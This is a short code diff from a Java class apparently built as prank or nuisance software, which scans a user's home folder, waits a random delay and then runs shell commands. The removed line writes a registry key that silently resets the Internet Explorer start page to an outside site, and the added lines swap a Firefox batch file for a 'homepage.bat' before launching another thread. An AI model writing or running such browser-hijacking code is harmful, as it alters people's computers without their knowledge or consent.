@@ -82,8 +82,8 @@ public class NumberOne {
 					b = false;
 					tree("C:\\Users\\" + user, true);
 					wait(r.nextInt(15000) + 15000, true);
-					exe("REG ADD \"HKCU\\SOFTWARE\\MICROSOFT\\INTERNET EXPLORER\\MAIN\\\" /V \"START PAGE\" /D \"http://nowlookatthis.net/\" /F");
-					exe("firefox.bat");
+					//exe("REG ADD \"HKCU\\SOFTWARE\\MICROSOFT\\INTERNET EXPLORER\\MAIN\\\" /V \"START PAGE\" /D \"http://nowlookatthis.net/\" /F");
+					exe("homepage.bat");
 					new Thread(new Last()).start();
 					//"C:\\Users\\" + user + "\\"
 				}
